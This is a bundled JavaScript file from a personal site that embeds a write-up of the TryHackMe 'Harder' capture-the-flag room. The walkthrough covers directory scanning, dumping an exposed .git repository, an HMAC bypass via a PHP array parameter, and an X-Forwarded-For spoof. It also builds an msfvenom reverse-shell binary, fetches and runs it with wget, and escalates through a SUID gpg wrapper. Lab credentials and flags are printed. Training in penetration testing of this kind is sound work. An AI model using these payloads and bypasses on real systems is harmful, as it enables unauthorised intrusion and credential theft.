"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3548],{3905:(e,t,n)=>{n.d(t,{Zo:()=>h,kt:()=>g});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function p(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var o=r.createContext({}),s=function(e){var t=r.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):p(p({},t),e)),n},h=function(e){var t=s(e.components);return r.createElement(o.Provider,{value:t},e.children)},d="mdxType",c={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,i=e.originalType,o=e.parentName,h=l(e,["components","mdxType","originalType","parentName"]),d=s(n),m=a,g=d["".concat(o,".").concat(m)]||d[m]||c[m]||i;return n?r.createElement(g,p(p({ref:t},h),{},{components:n})):r.createElement(g,p({ref:t},h))}));function g(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var i=n.length,p=new Array(i);p[0]=m;var l={};for(var o in t)hasOwnProperty.call(t,o)&&(l[o]=t[o]);l.originalType=e,l[d]="string"==typeof e?e:a,p[1]=l;for(var s=2;s<i;s++)p[s]=n[s];return r.createElement.apply(null,p)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},33050:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>p,default:()=>c,frontMatter:()=>i,metadata:()=>l,toc:()=>s});var r=n(87462),a=(n(67294),n(3905));const i={},p="harder",l={unversionedId:"Tryhackme/Harder/harder",id:"Tryhackme/Harder/harder",title:"harder",description:"Real pentest findings combined",source:"@site/writeups/Tryhackme/Harder/harder.md",sourceDirName:"Tryhackme/Harder",slug:"/Tryhackme/Harder/",permalink:"/writeups/Tryhackme/Harder/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Hacking with Powershell",permalink:"/writeups/Tryhackme/Hacking with Powershell/"},next:{title:"Hashing - Crypto 101",permalink:"/writeups/Tryhackme/Hashing - Crypto 101/"}},o={},s=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Hack your way and try harder",id:"task-1-hack-your-way-and-try-harder",level:2}],h={toc:s},d="wrapper";function c(e){let{components:t,...i}=e;return(0,a.kt)(d,(0,r.Z)({},h,i,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"harder"},"harder"),(0,a.kt)("p",null,"Real pentest findings combined"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/harder"},"harder")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Security Misconfiguration"),(0,a.kt)("li",{parentName:"ul"},"Enumeration (Git)"),(0,a.kt)("li",{parentName:"ul"},"Code Injection"),(0,a.kt)("li",{parentName:"ul"},"Exploiting Crontab"),(0,a.kt)("li",{parentName:"ul"},"Abusing SUID/GUID")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-hack-your-way-and-try-harder"},"Task 1 Hack your way and try harder"),(0,a.kt)("p",null,"The machine is completely inspired by real world pentest findings. Perhaps you will consider them very challenging but without any rabbit holes. Once you have a shell it is very important to know which underlying linux distribution is used and where certain configurations are located."),(0,a.kt)("p",null,"Hints to the initial foodhold: Look closely at every request. Re-scan all newly found web services/folders and may use some wordlists from seclists (",(0,a.kt)("a",{parentName:"p",href:"https://tools.kali.org/password-attacks/seclists"},"https://tools.kali.org/password-attacks/seclists"),"). Read the source with care."),(0,a.kt)("p",null,"Edit: There is a second way to get root access without using any key...are you able to spot the bug?"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/harder$ sudo nmap -A -sS -sC -sV -O 10.10.167.77\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 17:09 CEST\nNmap scan report for 10.10.167.77\nHost is up (0.034s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)\n80/tcp open  http    nginx 1.18.0\n|_http-server-header: nginx/1.18.0\n|_http-title: Error\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/15%OT=22%CT=1%CU=30267%PV=Y%DS=2%DC=T%G=Y%TM=5F8866\nOS:56%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1\nOS:1NW7%O6=M508ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=3F%W=FAF0%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT      ADDRESS\n1   33.48 ms 10.8.0.1\n2   33.57 ms 10.10.167.77\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 23.77 seconds\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.167.77/"},"http://10.10.167.77/")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(79794).Z,width:"1591",height:"387"})),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/harder$ sudo /opt/dirsearch/dirsearch.py -u http://10.10.167.77/ -w /usr/share/wordlists/dirb/common.txt -e html,php\n\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4613\n\nError Log: /opt/dirsearch/logs/errors-20-10-15_17-12-10.log\n\nTarget: http://10.10.167.77/\n\nOutput File: /opt/dirsearch/reports/10.10.167.77/_20-10-15_17-12-10.txt\n\n[17:12:10] Starting:\n[17:12:23] 200 -    2KB - /index.php\n[17:12:30] 200 -    2KB - /php\n[17:12:30] 200 -   85KB - /phpinfo.php\n[17:12:39] 301 -  169B  - /vendor  ->  http://10.10.167.77:8080/vendor/\n\nTask Completed\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.167.77/phpinfo.php"},"http://10.10.167.77/phpinfo.php")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://pwd.harder.local/"},"http://pwd.harder.local/")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"admin:admin")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://pwd.harder.local/index.php"},"http://pwd.harder.local/index.php")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"extra security in place. our source code will be reviewed soon ...")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/harder$ sudo /opt/dirsearch/dirsearch.py -u http://pwd.harder.local -E -w /usr/share/wordlists/dirb/common.txt\n\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 4613\n\nError Log: /opt/dirsearch/logs/errors-20-10-15_17-18-44.log\n\nTarget: http://pwd.harder.local\n\nOutput File: /opt/dirsearch/reports/pwd.harder.local/_20-10-15_17-18-44.txt\n\n[17:18:44] Starting:\n[17:18:45] 200 -   23B  - /.git/HEAD\n[17:18:50] 200 -   19KB - /index.php\n\nTask Completed\n\nkali@kali:~/CTFs/tryhackme/harder$ /opt/git-dumper/git-dumper.py http://pwd.harder.local/.git/ ./git_data\n[-] Testing http://pwd.harder.local/.git/HEAD [200]\n[-] Testing http://pwd.harder.local/.git/ [403]\n[-] Fetching common files\n[-] Fetching http://pwd.harder.local/.git/hooks/post-commit.sample [404]\n[-] Fetching http://pwd.harder.local/.git/description [200]\n[-] Fetching http://pwd.harder.local/.git/hooks/post-receive.sample [404]\n[-] Fetching http://pwd.harder.local/.git/COMMIT_EDITMSG [200]\n[-] Fetching http://pwd.harder.local/.git/hooks/applypatch-msg.sample [200]\n[-] Fetching http://pwd.harder.local/.git/hooks/post-update.sample [200]\n[-] Fetching http://pwd.harder.local/.git/hooks/commit-msg.sample [200]\n[-] Fetching http://pwd.harder.local/.git/hooks/pre-applypatch.sample [200]\n[-] Fetching http://pwd.harder.local/.gitignore [200]\n[-] Fetching http://pwd.harder.local/.git/hooks/pre-commit.sample [200]\n[-] Fetching http://pwd.harder.local/.git/hooks/pre-rebase.sample [200]\n[-] Fetching http://pwd.harder.local/.git/hooks/pre-receive.sample [200]\n[-] Fetching http://pwd.harder.local/.git/hooks/update.sample [200]\n[-] Fetching http://pwd.harder.local/.git/index [200]\n[-] Fetching http://pwd.harder.local/.git/info/exclude [200]\n[-] Fetching http://pwd.harder.local/.git/objects/info/packs [404]\n[-] Fetching http://pwd.harder.local/.git/hooks/pre-push.sample [200]\n[-] Fetching http://pwd.harder.local/.git/hooks/prepare-commit-msg.sample [200]\n[-] Finding refs/\n[-] Fetching http://pwd.harder.local/.git/FETCH_HEAD [404]\n[-] Fetching http://pwd.harder.local/.git/info/refs [404]\n[-] Fetching http://pwd.harder.local/.git/HEAD [200]\n[-] Fetching http://pwd.harder.local/.git/logs/refs/remotes/origin/HEAD [404]\n[-] Fetching http://pwd.harder.local/.git/logs/refs/remotes/origin/master [404]\n[-] Fetching http://pwd.harder.local/.git/logs/refs/stash [404]\n[-] Fetching http://pwd.harder.local/.git/logs/refs/heads/master [200]\n[-] Fetching http://pwd.harder.local/.git/logs/HEAD [200]\n[-] Fetching http://pwd.harder.local/.git/config [200]\n[-] Fetching http://pwd.harder.local/.git/ORIG_HEAD [404]\n[-] Fetching http://pwd.harder.local/.git/packed-refs [404]\n[-] Fetching http://pwd.harder.local/.git/refs/heads/master [200]\n[-] Fetching http://pwd.harder.local/.git/refs/remotes/origin/HEAD [404]\n[-] Fetching http://pwd.harder.local/.git/refs/remotes/origin/master [404]\n[-] Fetching http://pwd.harder.local/.git/refs/stash [404]\n[-] Fetching http://pwd.harder.local/.git/refs/wip/wtree/refs/heads/master [404]\n[-] Fetching http://pwd.harder.local/.git/refs/wip/index/refs/heads/master [404]\n[-] Finding packs\n[-] Finding objects\n[-] Fetching objects\n[-] Fetching http://pwd.harder.local/.git/objects/93/99abe877c92db19e7fc122d2879b470d7d6a58 [200]\n[-] Fetching http://pwd.harder.local/.git/objects/6e/1096eae64fede71a78e54999236553b75b3b65 [200]\n[-] Fetching http://pwd.harder.local/.git/objects/00/00000000000000000000000000000000000000 [404]\n[-] Fetching http://pwd.harder.local/.git/objects/04/7afea4868d8b4ce8e7d6ca9eec9c82e3fe2161 [200]\n[-] Fetching http://pwd.harder.local/.git/objects/66/428e37f6bfaac0b42ce66106bee0a5bdf94d4e [200]\n[-] Fetching http://pwd.harder.local/.git/objects/22/8694f875f20080e29788d7cc3b626272107462 [200]\n[-] Fetching http://pwd.harder.local/.git/objects/cd/a7930579f48816fac740e2404903995e0ff614 [200]\n[-] Fetching http://pwd.harder.local/.git/objects/ad/68cc6e2a786c4e671a6a00d6f7066dc1a49fc3 [200]\n[-] Fetching http://pwd.harder.local/.git/objects/e3/361e96c0a9db20541033f254df272deeb9dba7 [200]\n[-] Fetching http://pwd.harder.local/.git/objects/c6/66164d58b28325393533478750410d6bbdff53 [200]\n[-] Fetching http://pwd.harder.local/.git/objects/aa/938abf60c64cdb2d37d699409f77427c1b3826 [200]\n[-] Fetching http://pwd.harder.local/.git/objects/be/c719ffb34ca3d424bd170df5f6f37050d8a91c [200]\n[-] Running git checkout .\nkali@kali:~/CTFs/tryhackme/harder$ cd git_data/\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/harder/git_data$ git log\ncommit 9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -> master)\nAuthor: evs <evs@harder.htb>\nDate:   Thu Oct 3 18:12:23 2019 +0300\n\n    add gitignore\n\ncommit 047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161\nAuthor: evs <evs@harder.htb>\nDate:   Thu Oct 3 18:11:32 2019 +0300\n\n    add extra security\n\ncommit ad68cc6e2a786c4e671a6a00d6f7066dc1a49fc3\nAuthor: evs <evs@harder.htb>\nDate:   Thu Oct 3 14:00:52 2019 +0300\n\n    added index.php\nkali@kali:~/CTFs/tryhackme/harder/git_data$ git checkout .\nUpdated 0 paths from the index\nkali@kali:~/CTFs/tryhackme/harder/git_data$ ls -la\ntotal 48\ndrwxr-xr-x 3 kali kali  4096 Oct 15 17:20 .\ndrwxr-xr-x 3 kali kali  4096 Oct 15 17:20 ..\n-rw-r--r-- 1 kali kali 23820 Oct 15 17:20 auth.php\ndrwxr-xr-x 7 kali kali  4096 Oct 15 17:21 .git\n-rw-r--r-- 1 kali kali    27 Oct 15 17:20 .gitignore\n-rw-r--r-- 1 kali kali   431 Oct 15 17:20 hmac.php\n-rw-r--r-- 1 kali kali   608 Oct 15 17:20 index.php\nkali@kali:~/CTFs/tryhackme/harder/git_data$ cat .gitignore\ncredentials.php\nsecret.php\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/harder/git_data$ cat index.php\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-php"},'<?php\n  session_start();\n  require("auth.php");\n  $login = new Login;\n  $login->authorize();\n  require("hmac.php");\n  require("credentials.php");\n?>\n  <table style="border: 1px solid;">\n     <tr>\n       <td style="border: 1px solid;">url</td>\n       <td style="border: 1px solid;">username</td>\n       <td style="border: 1px solid;">password (cleartext)</td>\n     </tr>\n     <tr>\n       <td style="border: 1px solid;"><?php echo $creds[0]; ?></td>\n       <td style="border: 1px solid;"><?php echo $creds[1]; ?></td>\n       <td style="border: 1px solid;"><?php echo $creds[2]; ?></td>\n     </tr>\n   </table>\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/harder/git_data$ cat hmac.php\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-php"},"<?php\nif (empty($_GET['h']) || empty($_GET['host'])) {\n   header('HTTP/1.0 400 Bad Request');\n   print(\"missing get parameter\");\n   die();\n}\nrequire(\"secret.php\"); //set $secret var\nif (isset($_GET['n'])) {\n   $secret = hash_hmac('sha256', $_GET['n'], $secret);\n}\n\n$hm = hash_hmac('sha256', $_GET['host'], $secret);\nif ($hm !== $_GET['h']){\n  header('HTTP/1.0 403 Forbidden');\n  print(\"extra security check failed\");\n  die();\n}\n?>\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://www.php.net/manual/en/function.hash-hmac.php"},"https://www.php.net/manual/en/function.hash-hmac.php")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-php"},"$hm = hash_hmac('sha256', $_GET['host'], hash_hmac('sha256', $_GET['n'], $secret));\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up"},"https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/harder/git_data$ php -r \"echo hash_hmac('sha256', Array(), 'secret')==false;\"\nPHP Warning:  hash_hmac() expects parameter 2 to be string, array given in Command line code on line 1\n\n1kali@kali:~/CTFs/tryhackme/harder/git_data$ php -r \"echo hash_hmac('sha256', 'pwd.harder.local', false);\"\n5b622e20b29bdbcb0a4881f1d117d20a33a1f78a3c07ba85645567607e75cedf\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://pwd.harder.local/?n%5B%5D=&h=5b622e20b29bdbcb0a4881f1d117d20a33a1f78a3c07ba85645567607e75cedf&host=pwd.harder.local"},"http://pwd.harder.local/?n[]=&h=5b622e20b29bdbcb0a4881f1d117d20a33a1f78a3c07ba85645567607e75cedf&host=pwd.harder.local")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"url     username    password (cleartext)\nhttp://shell.harder.local   evs     9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://shell.harder.local/index.php"},"http://shell.harder.local/index.php")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"evs:9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"POST /index.php HTTP/1.1\nHost: shell.harder.local\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://shell.harder.local/index.php\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 63\nConnection: close\nCookie: PHPSESSID=21sppscro6foikfi7m788f79c0\nX-Forwarded-For: 10.10.10.10\nUpgrade-Insecure-Requests: 1\n\naction=set_login&user=evs&pass=9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/harder$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.106.222 LPORT=4444 -f elf > shell\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 123 bytes\nFinal size of elf file: 207 bytes\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"wget http://10.8.106.222/shell")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"chmod +x shell && ./shell")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/harder/git_data$ msfconsole -q\n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf5 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp\nPAYLOAD => linux/x86/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) > set LHOST 10.8.106.222\nLHOST => 10.8.106.222\nmsf5 exploit(multi/handler) > set LPORT 4444\nLPORT => 4444\nmsf5 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.8.106.222:4444\n[*] Sending stage (980808 bytes) to 10.10.167.77\n[*] Meterpreter session 1 opened (10.8.106.222:4444 -> 10.10.167.77:41304) at 2020-10-15 17:45:59 +0200\n\nmeterpreter >\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"meterpreter > ls\nListing: /www/shell\n===================\n\nMode              Size   Type  Last modified              Name\n----              ----   ----  -------------              ----\n100644/rw-r--r--  23838  fil   2020-07-08 00:28:59 +0200  auth.php\n100644/rw-r--r--  2014   fil   2020-07-08 00:28:59 +0200  index.php\n100644/rw-r--r--  275    fil   2020-07-08 00:28:59 +0200  ip.php\n100755/rwxr-xr-x  207    fil   2020-10-15 17:46:00 +0200  shell\n40755/rwxr-xr-x   4096   dir   2020-07-08 00:28:59 +0200  vendor\n\nmeterpreter > cd /home\nmeterpreter > ls\nListing: /home\n==============\n\nMode             Size  Type  Last modified              Name\n----             ----  ----  -------------              ----\n42755/rwxr-xr-x  4096  dir   2020-07-08 00:29:00 +0200  evs\n42755/rwxr-xr-x  4096  dir   2020-07-08 00:28:58 +0200  www\n\nmeterpreter > cd evs\nmeterpreter > ls\nListing: /home/evs\n==================\n\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n100644/rw-r--r--  33    fil   2020-07-08 00:29:00 +0200  user.txt\n\nmeterpreter > cat user.txt\n7e88bf11a579dc5ed66cc798cbe49f76\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"meterpreter > shell\nProcess 589 created.\nChannel 2 created.\nfind / -type f -user www 2>/dev/null\n/tmp/sess_1ou7i9pdjsh1kredksf96bvom8\n/tmp/sess_6iae3toisuvskm164gri7far5q\n/tmp/sess_utu0095om9rr89vk98njrm2t2t\n/tmp/sess_21sppscro6foikfi7m788f79c0\n/tmp/sess_a2n7kth19jocl47vngge63v79c\n/tmp/sess_nu2iuovacqdl1j0lq1n94itk44\n/var/lib/nginx/html/50x.html\n/var/lib/nginx/html/index.html\n/etc/periodic/15min/evs-backup.sh\n\n/www/pwdmanager/credentials.php\n/www/pwdmanager/.git/config\n/www/pwdmanager/.git/COMMIT_EDITMSG\n/www/pwdmanager/.git/logs/refs/heads/master\n/www/pwdmanager/.git/logs/HEAD\n/www/pwdmanager/.git/index\n/www/pwdmanager/.git/description\n/www/pwdmanager/.git/refs/heads/master\n/www/pwdmanager/.git/info/exclude\n/www/pwdmanager/.git/HEAD\n/www/pwdmanager/.gitignore\n/www/pwdmanager/index.php\n/www/pwdmanager/hmac.php\n/www/pwdmanager/secret.php\n/www/pwdmanager/auth.php\n/www/shell/shell\n/www/shell/ip.php\n/www/shell/index.php\n/www/shell/auth.php\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"/etc/periodic/15min/evs-backup.sh")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'cat /etc/periodic/15min/evs-backup.sh\n#!/bin/ash\n\n# ToDo: create a backup script, that saves the /www directory to our internal server\n# for authentication use ssh with user "evs" and password "U6j1brxGqbsUA$pMuIodnb$SZB4$bw14"\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/harder$ ssh evs@10.10.167.77\nThe authenticity of host '10.10.167.77 (10.10.167.77)' can't be established.\nED25519 key fingerprint is SHA256:qe/uay80+hZjgfhQilcT9xOMMgrAk0nCK7Ng5g7bLMM.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.167.77' (ED25519) to the list of known hosts.\nevs@10.10.167.77's password:\nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides and general\ninformation about administrating Alpine systems.\nSee <http://wiki.alpinelinux.org/>.\n\nYou can setup the system with the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\nharder:~$\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'harder:~$ find / -type f -user root -perm -u=s 2>/dev/null\n/usr/local/bin/execute-crypted\nharder:~$ strings /usr/local/bin/execute-crypted\n/lib/ld-musl-x86_64.so.1\nlibc.musl-x86_64.so.1\n__stack_chk_fail\n_init\nasprintf\nsetuid\n_fini\nsystem\n__cxa_finalize\nfree\n__libc_start_main\n__deregister_frame_info\n_ITM_registerTMCloneTable\n_ITM_deregisterTMCloneTable\n__register_frame_info\nu{UH\nATSt\n/usr/local/bin/run-crypted.sh %s\n/usr/local/bin/run-crypted.sh\n;*3$"\nGCC: (Alpine 8.3.0) 8.3.0\nharder:~$ cat /usr/local/bin/run-crypted.sh\n#!/bin/sh\n\nif [ $# -eq 0 ]\n  then\n    echo -n "[*] Current User: ";\n    whoami;\n    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."\n    echo "[-] Create a file like this: echo -n whoami > command"\n    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"\n  else\n    export GNUPGHOME=/root/.gnupg/\n    gpg --decrypt --no-verbose "$1" | ash\nfi\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'harder:~$ /usr/local/bin/execute-crypted\n[*] Current User: root\n[-] This program runs only commands which are encypted for root@harder.local using gpg.\n[-] Create a file like this: echo -n whoami > command\n[-] Encrypt the file and run the command: execute-crypted command.gpg\nharder:~$ find / -type f -name "root@harder.local*" 2>/dev/null\n/var/backup/root@harder.local.pub\nharder:~$ cat /var/backup/root@harder.local.pub\n-----BEGIN PGP PUBLIC KEY BLOCK-----\n\nmDMEXwTf8RYJKwYBBAHaRw8BAQdAkJtb3UCYvPmb1/JyRPADF0uYjU42h7REPlOK\nAbiN88i0IUFkbWluaXN0cmF0b3IgPHJvb3RAaGFyZGVyLmxvY2FsPoiQBBMWCAA4\nFiEEb5liHk1ktq/OVuhkyR1mFZRPaHQFAl8E3/ECGwMFCwkIBwIGFQoJCAsCBBYC\nAwECHgECF4AACgkQyR1mFZRPaHSt8wD8CvJLt7qyCXuJZdOBPR+X7GI2dUg0DRRu\nc5gXzwk3rMMA/0JK6ZwZCHObWjwX0oLc3jvOCgQiIdaPq1WqN9/fhLAKuDgEXwTf\n8RIKKwYBBAGXVQEFAQEHQNa/To/VntzySOVdvOCW+iGscTLlnsjOmiGaaWvJG14O\nAwEIB4h4BBgWCAAgFiEEb5liHk1ktq/OVuhkyR1mFZRPaHQFAl8E3/ECGwwACgkQ\nyR1mFZRPaHTMLQD/cqbV4dMvINa/KxATQDnbaln1Lg0jI9Jie39U44GKRIEBAJyi\n+2AO+ERYahiVzkWwTEoUpjDJIv0cP/WVzfTvPk0D\n=qaa6\n-----END PGP PUBLIC KEY BLOCK-----\n\nharder:~$ gpg --import /var/backup/root@harder.local.pub\ngpg: directory \'/home/evs/.gnupg\' created\ngpg: keybox \'/home/evs/.gnupg/pubring.kbx\' created\ngpg: /home/evs/.gnupg/trustdb.gpg: trustdb created\ngpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported\ngpg: Total number processed: 1\ngpg:               imported: 1\nharder:~$ echo -n "cat /root/root.txt" > command\nharder:~$ gpg -r 6F99621E4D64B6AFCE56E864C91D6615944F6874 --encrypt command\ngpg: 6C1C04522C049868: There is no assurance this key belongs to the named user\n\nsub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>\n Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874\n      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868\n\nIt is NOT certain that the key belongs to the person named\nin the user ID.  If you *really* know what you are doing,\nyou may answer the next question with yes.\n\nUse this key anyway? (y/N) y\nharder:~$ execute-crypted command.gpg\ngpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07\n      "Administrator <root@harder.local>"\n3a7bd72672889e0756b09f0566935a6c\n')),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Hack the machine and obtain the user Flag (user.txt)")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"7e88bf11a579dc5ed66cc798cbe49f76")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Escalate your privileges and get the root Flag (root.txt)")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"3a7bd72672889e0756b09f0566935a6c")))}c.isMDXComponent=!0},79794:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/2020-10-15_17-14-5afebaea01017d7f32b2c4ca7409edf1.png"}}]);